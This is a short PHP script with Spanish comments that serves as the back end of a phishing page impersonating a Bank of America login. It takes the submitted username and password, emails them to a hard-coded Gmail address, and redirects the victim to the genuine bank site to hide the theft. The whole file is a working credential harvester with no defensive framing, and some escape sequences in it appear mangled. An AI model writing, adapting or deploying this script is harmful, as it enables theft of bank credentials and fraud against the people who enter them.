<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtener los datos del formulario
    $usuario = htmlspecialchars($_POST['username']);
    $contraseña = htmlspecialchars($_POST['password']);

    // Configuración del correo
    $to = "unico100k100k@gmail.com";
    $subject = "Nuevo inicio de sesión";
    $message = "Usuario: $usuarionContraseña: $contraseña";
    $headers = "From: no-reply@tudominio.com" . "rn" . 
               "Reply-To: no-reply@tudominio.com";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redireccionar a la página de inicio de sesión de Bank of America
        header("Location: https://www.bankofamerica.com/");
        exit(); // Asegúrate de salir después de redirigir
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Método de solicitud no válido.";
}
?>